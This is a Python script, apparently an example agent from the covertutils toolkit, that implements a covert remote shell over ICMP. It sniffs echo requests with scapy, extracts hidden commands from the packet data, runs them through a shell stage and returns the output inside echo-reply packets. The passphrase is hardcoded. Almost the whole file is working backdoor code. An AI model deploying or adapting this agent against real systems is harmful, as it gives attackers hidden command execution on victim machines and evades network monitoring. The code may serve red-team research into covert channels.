#!/usr/bin/env python

from covertutils.orchestration import SimpleOrchestrator
from covertutils.handlers import ResponseOnlyHandler, FunctionDictHandler
from covertutils.payloads import CommonStages

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import sniff, IP, ICMP, Raw
from scapy.all import send as scapy_send


from threading import Thread
from time import sleep
from random import randint

from struct import pack
import time

passphrase = "pass"

packet_info = []
icmp_packets = []

#============================== Networking part ===========================
# The networking is handled by Python API. No 'covertutils' code here...

def add_icmp_packet( pkt ) :
	global icmp_packets
	icmp_packets.append( pkt )


def collect_icmp() :
	sniff( filter = "icmp[icmptype] == icmp-echo", prn = add_icmp_packet, store = False )


def recv( ) :
	while not icmp_packets :
		sleep(0.01)

	pkt = icmp_packets.pop(0)
	timestamp = str(pkt[Raw])[:4]
	ret = str(pkt[Raw])[4:]			# remove the timestamp
	packet_info.insert( 0, (pkt[IP].src, pkt[ICMP].seq, pkt[ICMP].id, timestamp ) )
	return ret


def send( raw_data ) :
	ip_id = randint( 0, 65535 )
	handler_ip, icmp_seq, icmp_id, timestamp = packet_info[0]
	pkt = IP( dst = handler_ip, id = ip_id )/ICMP( type = "echo-reply", seq = icmp_seq, id = icmp_id )/Raw( timestamp + raw_data )
	scapy_send( pkt, verbose = False )


sniff_thread = Thread( target = collect_icmp )
sniff_thread.daemon = True
sniff_thread.start()
#==========================================================================




#============================== Handler Overriding part ===================


_function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }

class AgentHandler( ResponseOnlyHandler, FunctionDictHandler ) :


	def onNotRecognised( self ) :
		global packet_info
		del packet_info[0]
		# print "[!] Unrecognised"

	def onChunk( self, stream, message ) :
		# print "[+] Got Chunk!"
		if not message :
			self.onMessage( stream, self.request_data )


	def onMessage( self, stream, message ) :
		# print message
		if message == self.request_data :
			ret_stream, ret_message = stream, message
		else :
			ret_stream, ret_message = FunctionDictHandler.onMessage( self, stream, message )

		# print "[%] Got a Message!"
		responded = ResponseOnlyHandler.onMessage( self, ret_stream, ret_message )
		if not responded :	# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
			# print "Not responded"
			self.queueSend( ret_message, ret_stream );	# Make it respond anyway with 'X' (see Client)
			responded = ResponseOnlyHandler.onMessage( self, ret_stream, ret_message )
			# print responded
			assert responded == True		# This way we know it responsed!
		# print message
#==========================================================================



#=============================Handler Creation=============================

orchestrator = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 52, in_length = 52 )
agent = AgentHandler( recv, send, orchestrator, function_dict = _function_dict )

#==========================================================================


# Wait forever as all used threads are daemonized

while 1 :	sleep(1)
